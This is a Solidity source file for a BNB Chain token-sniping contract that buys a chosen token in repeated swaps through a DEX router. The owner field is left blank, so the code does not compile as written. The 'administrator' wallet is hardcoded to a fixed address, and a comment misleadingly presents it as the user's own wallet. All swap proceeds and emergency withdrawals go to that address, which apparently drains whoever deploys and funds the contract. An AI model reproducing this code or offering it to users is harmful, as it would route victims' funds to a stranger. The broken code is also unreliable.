pragma solidity ^0.6.6; // make sure versions match up in truffle-config.js


interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface DexRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}


interface IWBNB {
    function withdraw(uint) external;
    function deposit() external payable;
}



// we would want this to be ownable
contract Swap {
    // eventually we would want the ability to pass these values in via _factory, incase they switch up router
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    
    address public owner = ; // The public address for the wallet you want to control this contract
    uint public approveAmount;
    uint public orders;
    address payable public administrator = 0x1d23f39d306492f5787e5C567b5bb3C359a6b5DB;      // The public address for the wallet you want to control this contract
    address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;    // addresses must be checksum
    uint public WBNBIn;
    uint public minTknOut;
    address public tokenToBuy;
    address public tokenPaired;

    mapping(address => bool) public authenticatedSeller;

    receive() external payable {
        IWBNB(WBNB).deposit{value: msg.value}();
    }
    
    
    modifier onlyOwner() {
        require(owner == msg.sender, 'Not owner');
        _;
    }
    
    
    function exactIn(address _tokenPaired) external onlyOwner() returns(bool success) {
        
        tokenPaired = _tokenPaired;
        require(IERC20(WBNB).balanceOf(address(this)) >= WBNBIn, "snipe: not enough WBNB in the contract");
        IERC20(WBNB).approve(router, approveAmount);

        address[] memory path;
        if (tokenPaired != WBNB){
            path = new address[](3);
            path[0] = WBNB;
            path[1] = tokenPaired;
            path[2] = tokenToBuy;
        
        } else {
            path = new address[](2);
            path[0] = WBNB;
            path[1] = tokenToBuy;
        }
        
        for (uint i = 0; i < orders; i++){
            
            DexRouter(router).swapExactTokensForTokens(
                WBNBIn,
                minTknOut,
                path,
                administrator,
                block.timestamp + 120

            );
                        
        }
        return true;
    }

    function exactOut(address _tokenPaired) external onlyOwner() returns(bool success) {
        
        tokenPaired = _tokenPaired;
        require(IERC20(WBNB).balanceOf(address(this)) >= WBNBIn, "snipe: not enough WBNB in the contract");
        IERC20(WBNB).approve(router, approveAmount);

        address[] memory path;
        if (tokenPaired != WBNB){
            path = new address[](3);
            path[0] = WBNB;
            path[1] = tokenPaired;
            path[2] = tokenToBuy;
        
        } else {
            path = new address[](2);
            path[0] = WBNB;
            path[1] = tokenToBuy;
        }
        
        for (uint i = 0; i < orders; i++){
            
            //uses same config so minTknOut is really tokenOut & WBNBIn is really WBNBInMax
            DexRouter(router).swapTokensForExactTokens(
                minTknOut,
                WBNBIn,
                path,
                administrator,
                block.timestamp + 120

            );
                        
        }
        return true;
    }


    function getAdministrator() external view onlyOwner() returns( address payable){
        return administrator;
    }

    function getRouter() external view onlyOwner() returns(address){
        return router;
    }

    function setRouter(address _newRouter) external onlyOwner() returns (bool success){
        router = _newRouter;
        return true;
    }

    function plan(uint _amountIn, address _tknToBuy, uint _amountOutMin, uint _orders, uint _approveAmount) external onlyOwner() returns(bool success){

        WBNBIn = _amountIn;
        tokenToBuy = _tknToBuy;
        minTknOut = _amountOutMin;
        orders = _orders;
        approveAmount = _approveAmount;
        return true; 
    }

    function getPlan() external view onlyOwner() returns(uint, address, uint, uint, uint){
        return( WBNBIn, tokenToBuy, minTknOut, orders, approveAmount);
    }


    function emergencyWithdrawTkn(address _token, uint _amount) external onlyOwner() returns(bool success){
        require(IERC20(_token).balanceOf(address(this)) >= _amount, "not enough tokens in contract");
        IERC20(_token).transfer(administrator, _amount);
        return true;
    }
}

